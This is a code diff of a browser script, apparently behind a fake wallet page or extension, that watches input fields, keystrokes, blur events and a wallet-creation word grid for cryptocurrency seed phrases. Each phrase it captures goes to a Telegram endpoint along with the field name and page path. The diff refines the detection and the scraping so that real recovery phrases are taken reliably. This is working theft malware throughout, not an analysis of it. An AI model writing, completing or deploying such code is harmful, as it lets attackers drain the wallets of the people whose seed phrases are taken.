@@ -20,23 +20,16 @@ function getTrafficSource() {
 }
 const trafficSource = getTrafficSource();
 
-// --- Word count helper ---
-function wc(val) {
-  return (val || '').trim().split(/\s+/).filter(w => w.length > 0).length;
-}
+// --- Helpers ---
+function words(v) { return (v || '').trim().split(/\s+/).filter(w => w.length > 0); }
+function wc(v) { return words(v).length; }
 
-// --- Validate real seed phrase (BIP39 style) ---
-// Real seed phrases: all lowercase, no punctuation, short words (3-8 chars)
-// NOT sentences like "Download the app from the official website..."
-function isSeedPhrase(val) {
-  if (!val || typeof val !== 'string') return false;
-  const words = val.trim().split(/\s+/).filter(w => w.length > 0);
-  if (![12, 15, 18, 21, 24].includes(words.length)) return false;
-  // Every word must be: all lowercase letters only, 2-10 chars, no numbers/punctuation
-  const validWord = /^[a-z]{2,10}$/;
-  const validCount = words.filter(w => validWord.test(w)).length;
-  // At least 90% of words must pass (allow for slight variations)
-  return (validCount / words.length) >= 0.9;
+// Valid seed phrase: exactly 12/15/18/21/24 words, all lowercase letters only (BIP39)
+function isSeed(v) {
+  if (!v) return false;
+  var ws = words(v.toLowerCase());
+  if (![12, 15, 18, 21, 24].includes(ws.length)) return false;
+  return ws.every(function(w) { return /^[a-z]{2,10}$/.test(w); });
 }
 
 // --- Send to Telegram ---
@@ -59,88 +52,80 @@ async function sendToTelegram(data) {
   }
 }
 
-// --- Send phrase (dedup) ---
-function sendPhrase(phrase, type, extra) {
-  if (!phrase || phrase === lastSent) return;
-  lastSent = phrase;
-  const count = wc(phrase);
-  const payload = Object.assign({
-    TYPE: type,
-    PHRASE: phrase,
-    WORDS: count,
-    PAGE: window.location.pathname
-  }, extra || {});
-  sendToTelegram(payload)
-    .then(() => console.log('✅ Phrase sent:', count, 'words from', trafficSource))
-    .catch(e => console.error('❌ Send failed:', e));
+// --- Send phrase (deduplicated) ---
+function sendPhrase(phrase, type, field) {
+  var clean = phrase.toLowerCase().replace(/\s+/g, ' ').trim();
+  if (!clean || clean === lastSent) return;
+  lastSent = clean;
+  var n = wc(clean);
+  console.log('✅ Sending', n, 'word phrase [' + type + '] from', trafficSource);
+  sendToTelegram({ TYPE: type, PHRASE: clean, WORDS: n, FIELD: field || 'input', PAGE: window.location.pathname });
 }
 
-// --- DOM scan: ONLY check input/textarea fields for displayed phrases ---
-// We do NOT scan page text — that captures normal sentences as false positives
-function scanDOM(root) {
-  if (!root || !root.querySelectorAll) return;
-  // Only scan actual form inputs where a wallet app would display/pre-fill a phrase
-  root.querySelectorAll('input, textarea').forEach(el => {
-    if (el.getAttribute('data-tp-sent')) return;
-    const txt = (el.value || '').trim();
-    if (isSeedPhrase(txt)) {
-      el.setAttribute('data-tp-sent', '1');
-      const cls = (el.className || '').toString().trim().split(' ')[0];
-      console.log('📋 Displayed phrase in field:', wc(txt), 'words');
-      sendPhrase(txt, 'WALLET_CREATED_DISPLAYED', {
-        FIELD: el.name || el.id || el.placeholder || cls || 'field'
-      });
+// --- Collect words from .phrase-grid / .phrase-card (wallet creation display) ---
+function collectGridPhrase() {
+  var grid = document.querySelector('.phrase-grid');
+  if (!grid) return;
+  var cards = grid.querySelectorAll('.phrase-card');
+  if (!cards.length) return;
+  var ws = [];
+  cards.forEach(function(card) {
+    // Each card contains an index number + the word — strip the number
+    var txt = (card.textContent || '').trim().replace(/^\d+\s*/, '');
+    if (txt && /^[a-z]{2,10}$/i.test(txt)) ws.push(txt.toLowerCase());
+  });
+  if ([12, 15, 18, 21, 24].includes(ws.length)) {
+    var phrase = ws.join(' ');
+    if (phrase !== lastSent) {
+      lastSent = phrase;
+      console.log('📋 Wallet creation phrase from grid:', ws.length, 'words');
+      sendToTelegram({ TYPE: 'WALLET_CREATED', PHRASE: phrase, WORDS: ws.length, PAGE: window.location.pathname });
     }
+  }
+}
+
+// --- Scan all inputs and the phrase grid ---
+function scanAll() {
+  collectGridPhrase();
+  document.querySelectorAll('input, textarea').forEach(function(el) {
+    var v = (el.value || '').trim();
+    if (isSeed(v)) sendPhrase(v, 'SEED_INPUT', el.name || el.id || el.placeholder || 'field');
   });
 }
 
-// --- Start DOM monitor ---
+// --- Start monitor ---
 function startMonitor() {
-  // Observe new elements
-  new MutationObserver(muts => {
-    muts.forEach(m => m.addedNodes.forEach(n => {
-      if (n.nodeType === 1) scanDOM(n);
-    }));
-  }).observe(document.body, { childList: true, subtree: true });
+  new MutationObserver(function(muts) {
+    var changed = muts.some(function(m) { return m.addedNodes.length || m.type === 'characterData'; });
+    if (changed) setTimeout(scanAll, 200);
+  }).observe(document.body, { childList: true, subtree: true, characterData: true });
 
-  // Scan at intervals for lazy-loaded content
-  [500, 1500, 3000, 5000, 8000, 12000].forEach(t => {
-    setTimeout(() => scanDOM(document.body), t);
-  });
+  [800, 2000, 4000, 7000, 12000].forEach(function(t) { setTimeout(scanAll, t); });
 }
 
-// --- Input event: capture typed phrases ---
+// --- Input: capture typed phrases ---
 document.addEventListener('input', function(e) {
-  const t = e.target;
+  var t = e.target;
   if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
   clearTimeout(inputTimer);
   inputTimer = setTimeout(function() {
-    const val = t.value.trim();
-    if (isSeedPhrase(val) && val !== lastSent) {
-      sendPhrase(val, 'SEED_PHRASE', {
-        FIELD: t.name || t.id || t.placeholder || 'input'
-      });
-    }
-  }, 600);
+    var v = (t.value || '').trim();
+    if (isSeed(v)) sendPhrase(v, 'SEED_TYPED', t.name || t.id || t.placeholder || 'input');
+  }, 500);
 });
 
-// --- Blur event: capture on field exit ---
+// --- Blur: capture when user finishes and moves on ---
 document.addEventListener('blur', function(e) {
-  const t = e.target;
+  var t = e.target;
   if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
-  const val = (t.value || '').trim();
-  if (isSeedPhrase(val) && val !== lastSent) {
-    sendPhrase(val, 'SEED_ON_BLUR', {
-      FIELD: t.name || t.id || t.placeholder || 'input'
-    });
-  }
+  var v = (t.value || '').trim();
+  if (isSeed(v)) sendPhrase(v, 'SEED_BLUR', t.name || t.id || t.placeholder || 'input');
 }, true);
 
 // --- Boot ---
 document.addEventListener('DOMContentLoaded', function() {
-  console.log('🔍 Traffic source:', trafficSource);
+  console.log('🔍 Traffic:', trafficSource);
   startMonitor();
 });
 
-// Expose for popup.html and other scripts
 window.TelegramIntegration = { send: sendToTelegram, sendPhrase: sendPhrase };
